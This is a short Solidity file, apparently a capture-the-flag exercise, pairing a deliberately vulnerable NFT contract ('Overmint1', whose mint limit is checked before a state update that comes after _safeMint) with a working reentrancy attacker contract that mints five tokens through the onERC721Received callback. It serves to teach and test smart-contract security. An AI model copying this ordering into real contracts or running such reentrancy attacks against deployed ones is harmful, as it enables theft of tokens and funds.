// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 targetContract;
    address attacker;

    constructor(address _targetContract) {
        targetContract = Overmint1(_targetContract);
        attacker = msg.sender;
    }

    function attack() external {
        targetContract.mint();
        for (uint256 i = 1; i <= 5; ++i) {
            targetContract.transferFrom(address(this), attacker, i);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (targetContract.totalSupply() < 5) {
            targetContract.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
